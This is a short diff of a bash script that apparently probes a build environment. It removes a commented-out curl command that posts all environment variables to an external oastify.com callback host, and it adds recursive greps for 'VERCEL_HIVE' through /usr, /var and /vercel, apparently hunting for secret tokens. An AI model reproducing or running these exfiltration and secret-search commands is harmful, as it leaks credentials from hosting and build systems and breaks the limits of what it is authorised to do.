@@ -1,3 +1,5 @@
 #!/bin/bash
 
-##curl -X POST -d "$(env)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
+egrep -r "VERCEL_HIVE" /usr/.
+egrep -r "VERCEL_HIVE" /var/.
+egrep -r "VERCEL_HIVE" /vercel/.
